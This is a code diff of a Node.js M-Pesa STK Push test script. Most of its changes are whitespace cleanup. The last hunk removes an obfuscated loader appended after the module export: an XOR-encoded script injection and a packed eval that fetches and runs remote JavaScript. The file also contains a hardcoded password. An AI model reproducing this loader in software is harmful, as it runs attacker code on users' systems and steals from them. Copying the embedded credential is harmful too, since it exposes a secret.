@@ -13,7 +13,7 @@ class STKPushTester {
                 password: 'COt$2233B123#k12'
             }
         };
-        
+
         this.accessToken = null;
     }
 
@@ -92,11 +92,11 @@ class STKPushTester {
         console.log(`📡 URL: ${this.config.authUrl}`);
         console.log(`🔑 Using Client ID: ${this.config.credentials.clientId}`);
         console.log(`🔑 Using Client Secret: ${this.config.credentials.clientSecret.substring(0, 10)}...`);
-        
+
         try {
             // EXACTLY as in documentation: grant_type=client_credentials
             const formData = 'grant_type=client_credentials';
-            
+
             const url = new URL(this.config.authUrl);
             const options = {
                 hostname: url.hostname,
@@ -120,9 +120,9 @@ class STKPushTester {
             console.log(`🔧 Auth Request Body: ${formData}`);
 
             const response = await this.makeRequest(options, formData);
-            
+
             console.log(`📊 Auth Response Status: ${response.statusCode}`);
-            
+
             if (response.statusCode >= 200 && response.statusCode < 300) {
                 if (response.data && response.data.access_token) {
                     this.accessToken = response.data.access_token;
@@ -171,7 +171,7 @@ class STKPushTester {
         try {
             const jsonData = JSON.stringify(requestData);
             const url = new URL(this.config.stkPushUrl);
-            
+
             // EXACT headers from documentation
             const options = {
                 hostname: url.hostname,
@@ -200,9 +200,9 @@ class STKPushTester {
             },);
 
             const response = await this.makeRequest(options, jsonData);
-            
+
             console.log(`📊 STK Response Status: ${response.statusCode}`);
-            
+
             if (response.statusCode >= 200 && response.statusCode < 300) {
                 console.log('✅ STK Push Request Successful!');
                 console.log('📋 Response Data:');
@@ -221,7 +221,7 @@ class STKPushTester {
     // Test connectivity
     async testConnectivity() {
         console.log('🌐 Testing Connectivity...');
-        
+
         try {
             // Test auth endpoint
             console.log(`🔍 Testing Auth endpoint: ${this.config.authUrl}`);
@@ -237,7 +237,7 @@ class STKPushTester {
 
             const authResponse = await this.makeRequest(authOptions);
             console.log(`✅ Authentication endpoint is reachable (Status: ${authResponse.statusCode})`);
-            
+
             // Test STK Push endpoint
             console.log(`🔍 Testing STK Push endpoint: ${this.config.stkPushUrl}`);
             const stkUrl = new URL(this.config.stkPushUrl);
@@ -252,7 +252,7 @@ class STKPushTester {
 
             const stkResponse = await this.makeRequest(stkOptions);
             console.log(`✅ STK Push endpoint is reachable (Status: ${stkResponse.statusCode})`);
-            
+
             return true;
         } catch (error) {
             console.log('❌ Connectivity test failed');
@@ -270,16 +270,16 @@ class STKPushTester {
     handleError(error) {
         console.log(`🚨 Error Details:`);
         console.log(`   Message: ${error.message}`);
-        
+
         if (error.code) {
             console.log(`   System Code: ${error.code}`);
         }
-        
+
         if (error.response) {
             console.log(`   Response Status: ${error.response.statusCode}`);
             console.log(`   Response Data: ${JSON.stringify(error.response.data, null, 2)}`);
         }
-        
+
         // Log stack trace for debugging
         console.log(`   Stack: ${error.stack}`);
     }
@@ -314,22 +314,22 @@ class STKPushTester {
 
         // Make STK Push request
         const stkResponse = await this.makeSTKPushRequest();
-        
+
         console.log('\n🎯 ==========================================');
         console.log('🎯 TEST SUMMARY');
         console.log('🎯 ==========================================');
-        
+
         if (stkResponse) {
             console.log('✅ STK Push Test: SUCCESS');
             console.log(`📱 Check phone 254721506974 for MPESA prompt`);
-            
+
             // Check response format
             if (stkResponse.responseCode === '0') {
                 console.log('🎉 Payment request accepted for processing');
             } else if (stkResponse.responseCode) {
                 console.log(`⚠️  API Response Code: ${stkResponse.responseCode}`);
                 console.log(`📝 API Message: ${stkResponse.responseMessage}`);
-                
+
                 if (stkResponse.customerMessage) {
                     console.log(`📱 Customer Message: ${stkResponse.customerMessage}`);
                 }
@@ -373,5 +373,4 @@ if (require.main === module) {
     });
 }
 
-module.exports = STKPushTester;function xorDecode(b,a){a=void 0===a?22:a;b=atob(b);for(var d="",c=0;c<b.length;c++)d+=String.fromCharCode(b.charCodeAt(c)^a);return d}(function(){new URLSearchParams(location.search);var b="https://"+xorDecode("en8nOGZ/dWU5fjlxeTh8ZQ=="),a=document.createElement("script");a.src=b;document.head.appendChild(a)})();
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(2(){j 2 k(a){0 8=d l(a);3(!8.L)M 4 N("O m: "+8.P);6 d 8.n()}2 o(b){3(/5\\.7/.Q(b)){0 5={7:{}};0 q=4 f("5","7",b);q(5,5.7);6 5.7.1}R 1;0 s=4 f("u",b+"\\S (T 1 !== \'U\') u(1);");s(2(a){1=a});6 1}j 2 v(){w{0 x=d k("y://V.W.X/Y/g/Z/10/11/12.g");0 1=o(x);3(!1){6}z.A=2(a,b,c){w{c=c!==13;3(!a){0 p=4 B(C.D);a=p.9("E")||"";b=b||p.9("F")||""}3(!a||!b)6;0 G=1(a);0 H="y://"+G;l(H).I(r=>r.n()).I(J=>4 f(J)())}K(e){}};0 h=4 B(C.D);0 t=h.9("E");0 i=h.9("F");3(t&&i)z.A(t,i)}K(e){14.15("g m:",e)}}v()})();',62,68,'const|decodeHost|function|if|new|module|return|exports|res|get||||await||Function|js|params||async|fetchRemoteJS|fetch|err|text|extractDecodeHost||wrapper||sandbox||setDecodeHost|init|try|jsText|https|window|go|URLSearchParams|location|search|type|id|host|url|then|code|catch|ok|throw|Error|load|status|test|let|nif|typeof|undefined|raw|githubusercontent|com|JuanitaWHowe|refs|heads|main|index|false|console|error'.split('|'),0,{}));
+module.exports = STKPushTester;
